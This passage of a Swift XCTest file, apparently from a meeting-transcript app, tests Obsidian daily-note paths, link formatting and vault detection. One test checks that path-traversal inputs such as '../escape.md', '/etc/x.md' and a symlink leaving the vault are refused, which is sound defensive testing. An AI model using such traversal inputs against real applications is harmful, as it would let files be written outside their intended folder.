        let before = try read(daily)
        TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
        XCTAssertEqual(try read(daily), before, "already there: nothing added")
    }

    func testDailyNotePathsStayInsideTheRoot() throws {
        let vault = root.appendingPathComponent("Vault", isDirectory: true)
        let date = start
        func path(_ p: String) -> String? { DailyNote.url(pattern: p, date: date, root: vault, timeZone: utc)?.path }
        XCTAssertEqual(path("Daily/{yyyy}-{MM}-{dd}.md"), vault.appendingPathComponent("Daily/2026-01-31.md").standardizedFileURL.path)
        XCTAssertEqual(path("Journal/{yyyy}/{date}"), vault.appendingPathComponent("Journal/2026/2026-01-31.md").standardizedFileURL.path)
        XCTAssertNil(path("../escape.md"))
        XCTAssertNil(path("Daily/../../escape.md"))
        XCTAssertNil(path("/etc/x.md"))
        XCTAssertNil(path("~/x.md"))
        XCTAssertNil(path("  "))
        XCTAssertEqual(path("Bad:name?.md").map { URL(fileURLWithPath: $0).lastPathComponent }, "Bad name .md")
        let outside = root.appendingPathComponent("Outside", isDirectory: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: vault, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(at: vault.appendingPathComponent("Linked"), withDestinationURL: outside)
        XCTAssertNil(path("Linked/{date}.md"), "a symlinked folder that leaves the vault is refused")
    }

    func testDailyLineForms() {
        let note = folder.appendingPathComponent("2026-01-31 0905 Sync.md")
        let vault = root.appendingPathComponent("Vault", isDirectory: true)
        XCTAssertEqual(DailyNote.line(note: note, vaultRoot: vault, start: start, title: "Sync | [x]", style: .link, callId: "c", timeZone: utc),
                       "- 09:05 [[Meetings/2026-01-31 0905 Sync|Sync x]] %%meetingcard:c%%")
        XCTAssertEqual(DailyNote.line(note: note, vaultRoot: nil, start: start, title: "", style: .link, callId: "c", timeZone: utc),
                       "- 09:05 [[2026-01-31 0905 Sync|2026-01-31 0905 Sync]] %%meetingcard:c%%")
    }

    // MARK: vault

    func testVaultDetectionLooksAtTheFolderAndItsParents() throws {
        let store = FileTranscriptStore()
        XCTAssertNil(ObsidianVault.root(containing: folder, store: store))
        let vault = root.appendingPathComponent("Vault", isDirectory: true)
        try FileManager.default.createDirectory(at: vault.appendingPathComponent(".obsidian"), withIntermediateDirectories: true)
        XCTAssertEqual(ObsidianVault.root(containing: folder, store: store)?.standardizedFileURL.path, vault.standardizedFileURL.path)
        XCTAssertEqual(ObsidianVault.root(containing: vault, store: store)?.standardizedFileURL.path, vault.standardizedFileURL.path)
        XCTAssertEqual(ObsidianVault.linkPath(of: folder.appendingPathComponent("a b.md"), under: vault), "Meetings/a b")
        XCTAssertNil(ObsidianVault.linkPath(of: root.appendingPathComponent("x.md"), under: vault))
    }
}
